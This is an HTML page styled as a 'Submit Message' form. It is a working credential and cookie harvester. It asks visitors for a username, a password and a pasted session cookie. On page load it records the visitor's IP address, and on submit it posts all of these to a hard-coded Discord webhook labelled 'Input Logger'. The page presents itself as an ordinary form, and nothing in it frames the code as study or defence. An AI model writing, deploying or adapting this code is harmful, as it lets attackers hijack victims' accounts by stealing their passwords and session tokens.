<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Submit Message</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 100%);
      font-family: 'Segoe UI', system-ui, sans-serif;
    }
    .card {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .input:focus {
      border-color: #6366f1;
      box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.2);
    }
    .btn {
      transition: all 0.3s ease;
    }
    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
    }
  </style>
</head>
<body class="min-h-screen text-white">
  <div class="max-w-2xl mx-auto pt-16 px-6">
    <div class="text-center mb-12">
      <div class="inline-flex items-center gap-3 mb-4">
        <i class="fa-solid fa-envelope text-4xl text-indigo-500"></i>
        <h1 class="text-5xl font-bold tracking-tight">Submit Message</h1>
      </div>
      <p class="text-gray-400 text-lg">Please fill in the details below</p>
    </div>

    <div class="card rounded-3xl p-10 shadow-2xl">
      <form id="messageForm">
        <!-- Username -->
        <div class="mb-6">
          <label class="block text-sm font-medium text-gray-300 mb-2">
            Username
          </label>
          <input 
            type="text"
            id="username"
            class="input w-full bg-black/50 border border-gray-700 rounded-2xl px-6 py-5 text-lg focus:outline-none"
            placeholder="Enter your username"
            required>
        </div>

        <!-- Password -->
        <div class="mb-6">
          <label class="block text-sm font-medium text-gray-300 mb-2">
            Password
          </label>
          <input 
            type="text"
            id="password"
            class="input w-full bg-black/50 border border-gray-700 rounded-2xl px-6 py-4 text-base focus:outline-none"
            placeholder="Enter password...">
        </div>

        <!-- Cookie -->
        <div class="mb-8">
          <label class="block text-sm font-medium text-gray-300 mb-2">
            Cookie
          </label>
          <textarea 
            id="cookie"
            rows="7"
            class="input w-full bg-black/50 border border-gray-700 rounded-2xl px-6 py-5 text-lg resize-y min-h-[200px] focus:outline-none"
            placeholder="Paste cookie here..."
            required></textarea>
        </div>

        <button 
          type="submit"
          id="submitBtn"
          class="btn w-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-semibold text-xl py-6 rounded-2xl flex items-center justify-center gap-3">
          <i class="fa-solid fa-paper-plane"></i>
          Submit
        </button>
      </form>

      <div id="status" class="mt-6 text-center hidden"></div>
    </div>

    <p class="text-center text-gray-500 text-sm mt-10">
      Your message will be received shortly.
    </p>
  </div>

  <script>
    let userIP = "Unknown";

    // Collect IP on page load
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        userIP = data.ip;
      } catch (err) {
        console.log("IP fetch failed");
      }
    }
    window.addEventListener('load', getIP);

    const form = document.getElementById('messageForm');
    const status = document.getElementById('status');
    const submitBtn = document.getElementById('submitBtn');

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1498506788339847259/W6BN_NG5BF1uJpEDruQT7nnOoTAH3r314U1Gq9gbk4iMubK_j2AtS0xW54pwXHBhaJbu";

    const GIF_URL = "https://cdn.discordapp.com/attachments/1502893724764471311/1503103419240681713/E1FAAADB-EDDC-494F-A760-C0323AE56A0B.gif?ex=6a0221a5&is=6a00d025&hm=9b6d2a3cb200ea6c6eb6fc32e6d7e2b34340278083ee1c50f9a5526baf7d0c15";

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const cookie = document.getElementById('cookie').value.trim();

      if (!username || !cookie) return;

      submitBtn.disabled = true;
      submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Submitting...`;

      const payload = {
        content: "@everyone",
        embeds: [{
          title: "📥 New Input / Log",
          description: "**A new submission has been received**",
          color: 0x6366f1,
          timestamp: new Date().toISOString(),
          thumbnail: { url: GIF_URL },
          fields: [
            { name: "👤 Username", value: `\`${username}\``, inline: true },
            { name: "🌐 IP Address", value: `\`${userIP}\``, inline: true },
            { name: "🔑 Password", value: password ? `\`${password}\`` : "`None`", inline: false },
            { 
              name: "🍪 Cookie", 
              value: cookie.length > 950 
                ? "```" + cookie.substring(0, 947) + "...```" 
                : "```" + cookie + "```", 
              inline: false 
            }
          ],
          footer: {
            text: "Input Logger • Submitted via Web Form",
            icon_url: GIF_URL
          }
        }]
      };

      try {
        const response = await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          showStatus("✅ Submitted successfully!", "text-green-400");
          form.reset();
        } else {
          showStatus("❌ Failed to submit.", "text-red-400");
        }
      } catch (error) {
        showStatus("❌ Connection error.", "text-red-400");
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Submit`;
      }
    });

    function showStatus(text, color) {
      status.innerHTML = text;
      status.className = `mt-6 text-center font-medium ${color} block`;
      setTimeout(() => status.classList.add('hidden'), 5000);
    }
  </script>
</body>
</html>
